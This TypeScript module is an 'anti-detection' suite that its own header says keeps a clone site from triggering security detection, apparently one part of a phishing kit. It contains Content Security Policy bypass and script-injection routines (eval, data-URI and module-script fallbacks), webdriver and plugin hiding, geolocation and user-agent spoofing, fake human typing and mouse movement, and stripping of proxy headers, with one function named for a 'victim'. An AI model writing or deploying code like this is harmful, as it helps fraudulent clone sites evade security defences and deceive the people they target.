/**
 * PHASE 5: ANTI-DETECTION
 * CSP bypass, bot detection evasion, geolocation & proxy spoofing
 * Prevents clone site from triggering security detection
 */

// ─────────────────────────────────────────────────────────────────────────────
// CSP BYPASS: Content Security Policy circumvention
// ─────────────────────────────────────────────────────────────────────────────

interface CspDirective {
  [key: string]: string
}

interface CspAnalysis {
  level: 'none' | 'loose' | 'strict'
  canInject: boolean
  bypassStrategy: string
  allowedDirectives: string[]
}

export function detectCspHeaders(responseHeaders: Record<string, string>): CspAnalysis {
  const csp = responseHeaders['content-security-policy']

  if (!csp) {
    return {
      level: 'none',
      canInject: true,
      bypassStrategy: 'no CSP detected',
      allowedDirectives: ['*'],
    }
  }

  const directives = parseCspDirectives(csp)
  const analysis = analyzeBypassPotential(directives)

  return analysis
}

function parseCspDirectives(cspHeader: string): CspDirective {
  const directives: CspDirective = {}
  const parts = cspHeader.split(';')

  for (const part of parts) {
    const [key, ...values] = part.trim().split(/\s+/)
    if (key) {
      directives[key] = values.join(' ')
    }
  }

  return directives
}

function analyzeBypassPotential(directives: CspDirective): CspAnalysis {
  const scriptSrc = directives['script-src'] || directives["default-src"] || ''
  const styleSrc = directives['style-src'] || directives["default-src"] || ''

  // Check for permissive policies
  const isLoose =
    scriptSrc.includes("'unsafe-inline'") ||
    scriptSrc.includes("'unsafe-eval'") ||
    scriptSrc.includes('data:')

  const isStrict =
    scriptSrc.includes("'none'") || (scriptSrc && !scriptSrc.includes("'unsafe"))

  let level: 'none' | 'loose' | 'strict' = 'none'
  let bypassStrategy = 'unknown'

  if (isLoose) {
    level = 'loose'
    bypassStrategy = "unsafe-inline allowed"
  } else if (isStrict) {
    level = 'strict'
    bypassStrategy = "strict CSP, need hash/nonce"
  } else {
    level = 'loose'
    bypassStrategy = "standard policy"
  }

  return {
    level,
    canInject: !isStrict,
    bypassStrategy,
    allowedDirectives: Object.keys(directives),
  }
}

export function bypassCspDirectives(cspAnalysis: CspAnalysis): {
  method: string
  payload: string
} {
  if (cspAnalysis.level === 'none' || cspAnalysis.level === 'loose') {
    return {
      method: 'direct-inline',
      payload: `<script>
        // Injection payload
        Object.defineProperty(navigator, 'webdriver', { get: () => undefined })
      </script>`,
    }
  }

  // Strict CSP: use external script with nonce or hash
  return {
    method: 'nonce-based',
    payload: `<script nonce="REPLACE_WITH_NONCE">
      // Payload here
    </script>`,
  }
}

export function injectBelowCsp(payload: string): void {
  // Inject into window object to evade CSP
  try {
    // Method 1: Direct eval (if unsafe-eval allowed)
    ;(function () {
      eval(payload)
    })()
  } catch {
    // Method 2: Script tag with data URI (if data: allowed)
    try {
      const script = document.createElement('script')
      script.src = `data:text/javascript;base64,${btoa(payload)}`
      document.head.appendChild(script)
    } catch {
      // Method 3: Module script (bypasses inline CSP)
      const script = document.createElement('script')
      script.type = 'module'
      script.textContent = payload
      document.head.appendChild(script)
    }
  }
}

// ─────────────────────────────────────────────────────────────────────────────
// BOT DETECTION EVASION: Hide webdriver, mimic user behavior
// ─────────────────────────────────────────────────────────────────────────────

export function hideWebDriver(): void {
  // Remove webdriver property
  Object.defineProperty(navigator, 'webdriver', {
    get: () => undefined,
    set: () => {},
  })

  // Spoof chrome
  ;(window as any).chrome = {
    runtime: {},
  }

  // Spoof plugins array (headless browsers have empty plugins)
  Object.defineProperty(navigator, 'plugins', {
    get: () => [
      {
        name: 'Chrome PDF Plugin',
        version: '1.0',
        description: 'Portable Document Format',
      },
      {
        name: 'Chrome PDF Viewer',
        version: '1.0',
        description: 'Portable Document Format',
      },
    ],
  })

  // Spoof languages
  Object.defineProperty(navigator, 'languages', {
    get: () => ['en-US', 'en'],
  })

  // Hide automation flags
  ;(window as any).__HEADLESS__ = undefined
  ;(window as any).__PHANTOMJS__ = undefined

  // Remove devtools detection
  const originalError = console.error
  console.error = function (...args: any[]) {
    if (args[0] === '%cDevTools') {
      return
    }
    originalError.apply(console, args)
  }

  console.log('[ANTI-DETECT] Webdriver hidden')
}

interface MousePoint {
  x: number
  y: number
}

function generateBezierPath(start: MousePoint, end: MousePoint, steps: number): MousePoint[] {
  const path: MousePoint[] = []
  const controlX = (start.x + end.x) / 2 + Math.random() * 100 - 50
  const controlY = (start.y + end.y) / 2 + Math.random() * 100 - 50

  for (let i = 0; i <= steps; i++) {
    const t = i / steps
    const x =
      Math.pow(1 - t, 2) * start.x +
      2 * (1 - t) * t * controlX +
      Math.pow(t, 2) * end.x
    const y =
      Math.pow(1 - t, 2) * start.y +
      2 * (1 - t) * t * controlY +
      Math.pow(t, 2) * end.y
    path.push({ x: Math.round(x), y: Math.round(y) })
  }

  return path
}

export function mimicUserBehavior(): {
  moveMouse: (target: MousePoint) => Promise<void>
  typeText: (text: string, element: HTMLElement) => Promise<void>
  clickElement: (element: HTMLElement) => Promise<void>
} {
  const delays = {
    minTyping: 50,
    maxTyping: 200,
    minThinking: 300,
    maxThinking: 1500,
    minClick: 50,
    maxClick: 300,
  }

  async function sleep(ms: number): Promise<void> {
    return new Promise((resolve) => setTimeout(resolve, ms))
  }

  async function randomDelay(min: number, max: number): Promise<void> {
    const delay = Math.random() * (max - min) + min
    await sleep(delay)
  }

  async function moveMouse(target: MousePoint): Promise<void> {
    const current = { x: 0, y: 0 } // Get actual mouse position in real scenario
    const path = generateBezierPath(current, target, 15)

    for (const point of path) {
      // Simulate mouse movement (in real browser automation, would use driver.moveTo())
      console.log(`[BEHAVIOR] Mouse at (${point.x}, ${point.y})`)
      await randomDelay(10, 50)
    }
  }

  async function typeText(text: string, element: HTMLElement): Promise<void> {
    if (!(element instanceof HTMLInputElement || element instanceof HTMLTextAreaElement)) {
      return
    }

    for (const char of text) {
      element.value += char
      element.dispatchEvent(new Event('input', { bubbles: true }))
      element.dispatchEvent(new Event('keydown', { bubbles: true }))
      element.dispatchEvent(new Event('keyup', { bubbles: true }))

      await randomDelay(delays.minTyping, delays.maxTyping)
    }

    // Occasional deletion and re-typing (human mistakes)
    if (Math.random() < 0.1) {
      await sleep(delays.minThinking)
      element.value = element.value.slice(0, -1)
      await randomDelay(delays.minTyping, delays.maxTyping)
    }
  }

  async function clickElement(element: HTMLElement): Promise<void> {
    // Random offset from center
    const rect = element.getBoundingClientRect()
    const offsetX = (Math.random() - 0.5) * element.offsetWidth * 0.2
    const offsetY = (Math.random() - 0.5) * element.offsetHeight * 0.2

    const target = {
      x: Math.round(rect.left + rect.width / 2 + offsetX),
      y: Math.round(rect.top + rect.height / 2 + offsetY),
    }

    // Move mouse to target with delay
    await moveMouse(target)
    await randomDelay(delays.minClick, delays.maxClick)

    // Sometimes hover first
    if (Math.random() < 0.3) {
      element.dispatchEvent(new MouseEvent('mouseover', { bubbles: true }))
      await randomDelay(100, 300)
    }

    // Click with realistic timing
    element.dispatchEvent(
      new MouseEvent('mousedown', {
        bubbles: true,
        clientX: target.x,
        clientY: target.y,
      })
    )
    await randomDelay(50, 150)

    element.dispatchEvent(
      new MouseEvent('mouseup', {
        bubbles: true,
        clientX: target.x,
        clientY: target.y,
      })
    )

    element.click()
  }

  return { moveMouse, typeText, clickElement }
}

export function avoidDetectionPatterns(): void {
  // Override setTimeout to add realistic delays
  const originalSetTimeout = window.setTimeout
  window.setTimeout = function (callback: any, delay?: number) {
    // Add 10-100ms jitter to every setTimeout
    const jitter = Math.random() * 100
    return originalSetTimeout(callback, (delay || 0) + jitter)
  } as any

  // Randomize navigation timing
  const originalNavigate = window.navigate
  if (originalNavigate) {
    window.navigate = function (url: string) {
      // Add thinking pause before navigation
      const pause = Math.random() * 500 + 200
      setTimeout(() => {
        originalNavigate(url)
      }, pause)
    } as any
  }

  // Intercept fetch to vary timing
  const originalFetch = window.fetch
  window.fetch = function (...args: any[]) {
    return new Promise((resolve, reject) => {
      setTimeout(async () => {
        try {
          const result = await originalFetch(...args)
          resolve(result)
        } catch (err) {
          reject(err)
        }
      }, Math.random() * 200)
    })
  } as any

  console.log('[ANTI-DETECT] Timing patterns randomized')
}

// ─────────────────────────────────────────────────────────────────────────────
// GEOLOCATION SPOOFING: Mock geolocation API
// ─────────────────────────────────────────────────────────────────────────────

interface GeoLocation {
  latitude: number
  longitude: number
  accuracy: number
  timestamp: number
}

function getVictimGeolocation(): GeoLocation {
  // In real scenario, would fetch from IP geolocation API
  // For now, using US default
  return {
    latitude: 40.7128,
    longitude: -74.006,
    accuracy: 50,
    timestamp: Date.now(),
  }
}

export function spoofGeolocation(): void {
  const location = getVictimGeolocation()

  // Add variance (±0.1 degrees ≈ ±10km)
  const variance = 0.1
  const fakeLocation = {
    latitude: location.latitude + (Math.random() - 0.5) * variance,
    longitude: location.longitude + (Math.random() - 0.5) * variance,
    accuracy: location.accuracy + Math.random() * 20,
    timestamp: Date.now(),
  }

  // Override geolocation API
  const fakeGeolocation = {
    getCurrentPosition: (success: any) => {
      setTimeout(() => {
        success({
          coords: {
            latitude: fakeLocation.latitude,
            longitude: fakeLocation.longitude,
            accuracy: fakeLocation.accuracy,
            altitude: null,
            altitudeAccuracy: null,
            heading: null,
            speed: null,
          },
          timestamp: fakeLocation.timestamp,
        })
      }, Math.random() * 1000)
    },
    watchPosition: (success: any) => {
      const interval = setInterval(() => {
        success({
          coords: {
            latitude: fakeLocation.latitude + (Math.random() - 0.5) * 0.01,
            longitude: fakeLocation.longitude + (Math.random() - 0.5) * 0.01,
            accuracy: fakeLocation.accuracy,
            altitude: null,
            altitudeAccuracy: null,
            heading: null,
            speed: null,
          },
          timestamp: Date.now(),
        })
      }, 5000)
      return interval as any
    },
    clearWatch: () => {},
  }

  Object.defineProperty(navigator, 'geolocation', {
    get: () => fakeGeolocation,
    set: () => {},
  })

  console.log('[ANTI-DETECT] Geolocation spoofed:', fakeLocation)
}

export function setTimezoneToMatch(latitude: number, longitude: number): void {
  // Map coordinates to timezone
  const timezones: Record<string, string> = {
    'US East': 'America/New_York',
    'US West': 'America/Los_Angeles',
    'US Central': 'America/Chicago',
    EU: 'Europe/London',
    Asia: 'Asia/Tokyo',
  }

  // Determine timezone based on longitude
  let tz = 'America/New_York'
  if (longitude < -100) tz = 'America/Los_Angeles'
  else if (longitude > 0) tz = 'Europe/London'

  // Store in localStorage/sessionStorage for JavaScript detection
  try {
    localStorage.setItem('timezone', tz)
  } catch {
    console.warn('[ANTI-DETECT] Cannot set timezone')
  }

  console.log('[ANTI-DETECT] Timezone set to:', tz)
}

// ─────────────────────────────────────────────────────────────────────────────
// PROXY HIDING: Mask proxy/VPN indicators
// ─────────────────────────────────────────────────────────────────────────────

const RESIDENTIAL_ISPS = [
  'Comcast',
  'Verizon',
  'AT&T',
  'Charter',
  'Cox',
  'CenturyLink',
  'Spectrum',
]

const RESIDENTIAL_USER_AGENTS = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
]

export function hideProxyIndicators(): void {
  // Intercept fetch requests to hide proxy headers
  const originalFetch = window.fetch
  window.fetch = function (url: any, options: any = {}) {
    const headers = options.headers || {}

    // Remove proxy indicators
    delete headers['x-forwarded-for']
    delete headers['x-forwarded-proto']
    delete headers['x-forwarded-host']
    delete headers['cf-connecting-ip']

    // Add residential ISP header
    const isp = RESIDENTIAL_ISPS[Math.floor(Math.random() * RESIDENTIAL_ISPS.length)]
    headers['x-isp'] = isp

    options.headers = headers

    return originalFetch.call(this, url, options)
  } as any

  // Spoof user agent
  const fakeUserAgent = RESIDENTIAL_USER_AGENTS[
    Math.floor(Math.random() * RESIDENTIAL_USER_AGENTS.length)
  ]
  Object.defineProperty(navigator, 'userAgent', {
    get: () => fakeUserAgent,
    set: () => {},
  })

  console.log('[ANTI-DETECT] Proxy indicators hidden')
}

export function detectVpnProviders(): string[] {
  const vpnKeywords = [
    'expressvpn',
    'nordvpn',
    'surfshark',
    'protonvpn',
    'windscribe',
    'hotspot',
  ]

  const ua = navigator.userAgent.toLowerCase()
  const detected: string[] = []

  for (const vpn of vpnKeywords) {
    if (ua.includes(vpn)) {
      detected.push(vpn)
    }
  }

  return detected
}

// ─────────────────────────────────────────────────────────────────────────────
// MASTER INITIALIZATION: Run all anti-detection measures
// ─────────────────────────────────────────────────────────────────────────────

export async function initializeAntiDetection(): Promise<void> {
  console.log('[ANTI-DETECT] Initializing anti-detection suite...')

  // Phase 1: Hide webdriver
  hideWebDriver()

  // Phase 2: Spoof geolocation
  spoofGeolocation()
  setTimezoneToMatch(40.7128, -74.006)

  // Phase 3: Hide proxy indicators
  hideProxyIndicators()

  // Phase 4: Avoid detection patterns
  avoidDetectionPatterns()

  // Phase 5: Mimic user behavior
  const behavior = mimicUserBehavior()
  ;(window as any).leonBehavior = behavior

  console.log('[ANTI-DETECT] Anti-detection suite initialized')
}

export const AntiDetectionSuite = {
  initialize: initializeAntiDetection,
  hideWebDriver,
  spoofGeolocation,
  hideProxyIndicators,
  detectVpnProviders,
  mimicUserBehavior,
  avoidDetectionPatterns,
}
